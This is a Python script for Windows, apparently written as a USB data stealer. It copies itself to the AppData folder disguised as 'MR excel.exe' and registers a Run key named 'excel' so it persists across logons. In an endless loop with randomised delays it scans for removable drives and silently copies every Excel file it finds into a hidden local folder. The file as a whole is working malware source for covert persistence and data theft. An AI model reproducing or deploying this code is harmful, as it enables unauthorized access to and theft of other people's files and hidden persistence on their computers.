import os
import shutil
import ctypes
import subprocess,sys
import random,time

def random_time(min_second,max_second):
    delay=random.randint(min_second,max_second)
    time.sleep(delay)

#scan for exiest drivers
def partition_windows():
    p_list = []
    for p in range(65, 91):
        drive = f"{chr(p)}:\\"
        if os.path.exists(drive):
            p_list.append(drive)
    return p_list


def usb_drive(usb_path):
    return ctypes.windll.kernel32.GetDriveTypeW(usb_path)==2


# get all file have Same extention
def dir_f_list(d):
    extensions = [
       'xlsx',
    ]
    fd = []
    for root, _, files in os.walk(d):
        for file_name in files:
            full_path = os.path.join(root, file_name)

            if os.path.isfile(full_path):
                ex = full_path.split('.')[-1]
                if ex in extensions:
                    fd.append(full_path)
    return fd

def go_persistence():
    persistant_file_location=os.environ["appdata"]+"\\MR excel.exe"
    if not os.path.exists(persistant_file_location):
        shutil.copy(sys.executable,persistant_file_location)
        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v excel /t REG_SZ /d "' + persistant_file_location +'"')



# backup_dir = os.path.join(os.getcwd(), "backup_folder")
# print(f"Backup directory: {backup_dir}")
#
# # إنشاء المجلد إذا لم يكن موجوداً
# os.makedirs(backup_dir, exist_ok=True)
if __name__=="__main__":
    go_persistence()
    while True:
        try:
            random_time(20,60)
            Drivers = partition_windows()
            print("Available drives:", Drivers)

            for drive in Drivers:
                if usb_drive(drive):  # فحص فقط محركات USB
                    print(f"USB drive found: {drive}")
                    files_list = dir_f_list(drive)
                    print(f"Excel files found: {files_list}")

                    # نسخ الملفات إذا أردت
                    for file_path in files_list:
                        try:
                            file_name = os.path.basename(file_path)
                            # destination = os.path.join("backup_folder", file_name)
                            desktop_path = os.path.join(os.path.expanduser("~"), "Documents", "backup_folder")
                            # backup_dir = os.path.join(os.path.expanduser("~"), "Documents", "backup_folder")
                            # print(f"Backup directory: {backup_dir}")

                            # os.makedirs(backup_dir, exist_ok=True)
                            shutil.copy2(file_path, desktop_path)
                            print(f"Copied: {file_name}")
                        except Exception as e:
                            print(f"Error copying {file_path}: {e}")
        except Exception:
            random_time(10,60)



